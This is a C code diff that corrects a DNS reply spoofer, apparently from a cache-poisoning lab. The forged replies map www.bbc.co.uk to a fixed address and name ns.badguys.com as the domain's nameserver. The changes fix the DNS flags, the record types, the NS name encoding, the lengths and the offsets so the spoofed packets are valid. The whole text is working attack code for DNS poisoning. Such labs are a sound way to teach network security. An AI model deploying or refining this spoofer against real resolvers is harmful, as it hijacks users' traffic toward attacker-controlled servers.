@@ -72,7 +72,8 @@ void spoof_DNS_reply(struct ipheader* ip)
     newip->iph_sourceip = ip->iph_destip;
     newip->iph_destip = ip->iph_sourceip;
     newip->iph_ttl = 200;
-    newip->iph_protocol = IPPROTO_UDP; 
+    newip->iph_protocol = IPPROTO_UDP;
+    newip->iph_flag= htons(0x00); 
 
     
 
@@ -112,11 +113,11 @@ unsigned short construct_dns_reply(char *buffer)
 
 	char TARGET_DOMAIN[] = "www.bbc.co.uk";
 	char ANSWER_IPADDR[] = "1.2.3.4";
-	char NS_SERVER[] = "ns.badguys.com";
+	char NS_SERVER[] = "\x02\x6e\x73\x07\x62\x61\x64\x67\x75\x79\x73\x03\x63\x6f\x6d";
 	char NS_IPADDR[] = "1.2.3.5";
 
 	//construct the DNS header:
-	dns->flags=htons(0x8400); //Flag = response; this is a DNS response
+	dns->flags=htons(0x8180); //Flag = response; this is a DNS response
 
 	//the number for certain fields
 	dns->QDCOUNT=htons(1); // 1 question field
@@ -133,7 +134,7 @@ unsigned short construct_dns_reply(char *buffer)
 	p += strlen(p) + 1 + 2 + 2; //Skip the Question section (no change)
 
 	p += set_A_record(p, NULL, 0x0C, ANSWER_IPADDR); //Add an A record (Answer section)
-	p += set_NS_record(p, TARGET_DOMAIN, 0, NS_SERVER); //Add an NS record (Authority section)
+	p += set_NS_record(p, NULL, 0x0F, NS_SERVER); //Add an NS record (Authority section)
 	//p += set_A_record(p, NS_SERVER, 0, NS_IPADDR); //Add an A record (Additional section)
 	//printf("dns Length is %i",(p - buffer));
 	return p - buffer;
@@ -156,7 +157,7 @@ unsigned short set_A_record(char *buffer, char *name, char offset, char *ip_addr
 		p += strlen(name);
 	}
 
-	*((unsigned short *)p ) = htons(0x0C);	//Record Type
+	*((unsigned short *)p ) = htons(0x01);	//Record Type
 	p += 2;
 
 	*((unsigned short *)p ) = htons(0x01);	//Class
@@ -169,7 +170,7 @@ unsigned short set_A_record(char *buffer, char *name, char offset, char *ip_addr
 	p += 2;
 
 	((struct in_addr *)p)->s_addr = inet_addr(ip_addr); //IP address
-	p += 5;
+	p += 4;
 	//printf("A record is %i", \n, );
 	return (p-buffer);
 
@@ -200,7 +201,7 @@ unsigned short set_NS_record(char *buffer, char *name, char offset, char *name_s
 	*((unsigned int *)p ) = htonl(0x00002000);	//Time to Live
 	p += 4;
 
-	*((unsigned short *)p ) = htons(0x000C);		//Data Length (fix to make dynamic for size of )
+	*((unsigned short *)p ) = htons(0x10);		//Data Length (fix to make dynamic for size of )
 	p += 2;
 
 //	((struct in_addr *)p)->s_addr = inet_addr(ip_addr); //IP address
@@ -214,8 +215,10 @@ unsigned short set_NS_record(char *buffer, char *name, char offset, char *name_s
 		p++;
 	} else {
 		strcpy(p, name_server);
-		p += strlen(name) + 1;
+		p += strlen(name_server) ;
 	}
+	*p = '\0';
+	p++;
 
 	return (p-buffer);
 
